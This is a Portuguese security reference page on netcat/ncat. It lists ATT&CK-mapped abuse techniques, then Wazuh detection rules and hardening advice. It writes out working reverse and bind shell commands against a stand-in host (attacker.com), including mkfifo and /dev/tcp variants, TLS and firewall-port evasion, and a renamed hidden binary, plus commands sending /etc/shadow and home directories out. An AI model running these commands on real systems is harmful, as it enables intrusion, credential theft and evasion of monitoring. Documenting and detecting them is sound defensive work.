# nc (netcat / ncat)

**Plataforma:** Linux / macOS / Windows

**Categorias:** Shell reverso, Bind shell, Transferência de arquivos, Port scanning, Relay/pivoting

**MITRE ATT&CK:** T1059.004 (Unix Shell), T1105 (Ingress Tool Transfer), T1048 (Exfiltration), T1571 (Non-Standard Port)

**Referência ofensiva:** https://gtfobins.org/gtfobins/nc/

---

## O que é o netcat

O netcat (nc) é uma ferramenta de rede de propósito geral que lê e escreve dados através de conexões TCP e UDP. É frequentemente descrito como o "canivete suíço do TCP/IP". Existem várias implementações: a original (netcat tradicional), o OpenBSD netcat (presente no Debian/Ubuntu como padrão), o GNU netcat e o ncat (incluído no nmap).

Cada implementação tem suas particularidades — o OpenBSD netcat, por exemplo, não suporta a flag `-e` (que executa um programa ao receber conexão), enquanto o GNU netcat e o ncat suportam. Essa diferença importa tanto para o atacante quanto para o defensor: a ausência de `-e` no nc do Ubuntu não significa que o netcat é seguro nesse sistema, pois existem técnicas alternativas.

---

## Por que atacantes usam o netcat

O netcat é a ferramenta de shell reverso mais conhecida e documentada em segurança ofensiva, por razões históricas. Em ambientes modernos, foi amplamente substituído pelo socat e por shells reversos em Python ou bash puro, mas ainda aparece em sistemas mais antigos ou em scripts de exploração automatizados.

Mais relevante do ponto de vista defensivo: o netcat é frequentemente usado para transferência de arquivos entre hosts em redes internas sem acesso à internet, aproveitando que geralmente não há controles de egress na rede interna.

---

## Técnicas de abuso

### Shell reverso — com suporte a -e (GNU netcat / ncat)

```bash
# No servidor do atacante (listener)
nc -lvnp 4444

# Na vítima — enviar /bin/bash para o atacante
nc -e /bin/bash attacker.com 4444

# Variação com sh
nc -e /bin/sh attacker.com 4444

# Usando ncat (versão do nmap, mais funcional)
ncat -e /bin/bash attacker.com 4444
```

### Shell reverso — sem suporte a -e (OpenBSD netcat)

O OpenBSD netcat (padrão no Ubuntu/Debian) não tem a flag `-e`. Isso não impede a técnica — apenas requer combinação com outros recursos do shell.

```bash
# Via mkfifo (named pipe) — método mais comum
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 > /tmp/f

# Via /dev/tcp do bash encadeado com nc para o listener
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Via processo em background com redirecionamentos
/bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1 &
```

### Bind shell

Em vez de o alvo se conectar ao atacante (reverso), o alvo abre uma porta e aguarda conexão. Útil quando o atacante tem acesso à rede do alvo mas não tem endereço IP fixo ou o alvo tem restrições de saída.

```bash
# Na vítima — abre porta 5555 e executa bash para quem conectar
nc -lvnp 5555 -e /bin/bash

# Sem -e (OpenBSD)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 5555 > /tmp/f

# O atacante conecta
nc attacker-ip 5555
```

### Transferência de arquivos

```bash
# Receptor (destino)
nc -lvnp 9001 > arquivo_recebido.tar.gz

# Emissor (origem)
tar czf - /home/user/documentos | nc attacker.com 9001

# Transferência simples de arquivo único
nc -lvnp 9001 > /tmp/recebido.bin &
nc 192.168.1.50 9001 < /etc/shadow
```

Essa técnica é muito usada em movimentação lateral: o atacante compromete o Host A, usa o netcat para transferir ferramentas do seu servidor para o Host A, e depois usa o Host A como relay para alcançar o Host B.

### Relay e pivoting

```bash
# Criar relay: tudo que chega na porta 8080 é encaminhado para 192.168.1.100:80
mkfifo /tmp/relay
nc -lvnp 8080 < /tmp/relay | nc 192.168.1.100 80 > /tmp/relay
```

### Port scanning básico

```bash
# Verificar portas abertas em um host (lento mas funciona sem nmap)
nc -zv 192.168.1.1 1-1024 2>&1 | grep succeeded

# Verificar porta específica
nc -zv 192.168.1.100 22 && echo "SSH aberto"
```

---

## Técnicas de bypass e evasão

### Uso de ncat com criptografia TLS

O ncat (do projeto nmap) suporta TLS nativo, o que permite estabelecer shells reversos cifrados que passam por inspeção SSL simples como tráfego legítimo.

```bash
# Listener com TLS (atacante)
ncat --ssl -lvnp 4444

# Vítima conecta via TLS
ncat --ssl attacker.com 4444 -e /bin/bash
```

### Portas não padrão para contornar firewall

```bash
# Usar portas que normalmente estão liberadas no firewall de saída
nc attacker.com 80 -e /bin/bash   # HTTP
nc attacker.com 443 -e /bin/bash  # HTTPS
nc attacker.com 53 -e /bin/bash   # DNS
```

### Cópia e renomeação do binário

```bash
cp /bin/nc /tmp/.system_monitor
/tmp/.system_monitor attacker.com 4444 -e /bin/bash
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- nc ou ncat com flag `-e` seguida de `/bin/bash`, `/bin/sh` ou qualquer shell
- nc com destino externo em portas não padrão
- padrão mkfifo + cat + nc (shell reverso sem -e)
- nc executado por processo filho de servidor web ou daemon

**Indicadores de média relevância:**

- nc com flag `-l` em servidor de produção (bind shell)
- nc recebendo dados e redirecionando para arquivo (transferência de ferramenta)
- ncat com `--ssl` para destino externo

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0100-gtfobins_network.xml -->

<!-- nc com -e executando shell -->
<rule id="100216" level="15">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">^n?cat$|^ncat$</field>
  <field name="audit.execve" type="pcre2">-e.*(bash|/sh|python|perl)</field>
  <description>netcat com -e executando shell — shell reverso ou bind shell ativo</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>

<!-- nc executado por conta de serviço web -->
<rule id="100217" level="14">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">^n?cat$|^ncat$</field>
  <field name="audit.uid" type="pcre2">^(33|65534|99)$</field>
  <description>netcat executado por conta de servico web — possivel RCE</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>

<!-- nc com -l (modo listen) em servidor de produção -->
<rule id="100218" level="10">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">^n?cat$|^ncat$</field>
  <field name="audit.execve" type="pcre2">-l</field>
  <description>netcat em modo listen — possivel bind shell ou relay</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Administradores de sistema** — o netcat é amplamente usado para diagnóstico de rede e testes de conectividade. O uso legítimo geralmente não inclui a flag `-e` e não envolve servidores externos desconhecidos. Concentre alertas de nível alto na combinação nc + `-e` + shell.

**Scripts de monitoramento** — alguns scripts de healthcheck usam nc para testar portas. Filtre por destino (IPs internos conhecidos) e ausência de flags de execução de shell.

---

## Proteção e controles defensivos

**Remover netcat de servidores de produção:** em servidores que não têm necessidade operacional do netcat, remova o pacote. No Ubuntu/Debian, o pacote é `netcat-openbsd`; no CentOS/RHEL, `nmap-ncat`. Lembre-se de que o ncat vem junto com o nmap — ambos devem ser avaliados.

**Regras de egress no firewall:** mesmo que o netcat esteja presente, regras de firewall de saída que limitam conexões a destinos e portas conhecidos reduzem drasticamente o impacto. Combine com alertas para conexões de saída em portas incomuns.

---

## Referências

- GTFOBins — nc: https://gtfobins.org/gtfobins/nc/
- MITRE ATT&CK T1059.004: https://attack.mitre.org/techniques/T1059/004/
- MITRE ATT&CK T1105: https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK T1571: https://attack.mitre.org/techniques/T1571/
